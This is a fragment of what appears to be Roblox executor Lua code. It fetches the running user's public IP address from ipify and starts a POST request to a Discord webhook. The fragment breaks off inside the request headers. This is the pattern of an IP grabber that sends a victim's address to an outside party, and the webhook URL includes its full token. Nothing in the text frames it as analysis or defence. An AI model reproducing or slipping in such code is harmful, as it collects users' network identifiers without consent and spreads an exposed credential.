...
local ip_addy = game:HttpGet("https://api.ipify.org")
...
(syn and syn.request or http_request or http.request) {
    Url = 'https://discord.com/api/webhooks/1080505533498392586/SZl8RHCkKxwGH1AMqivjtWj2ft0VurHTZJn_Ymc-ufyOCt2yWqEoLuTGJZqcnAoLa6YZ';
    Method = 'POST';
    Headers = {
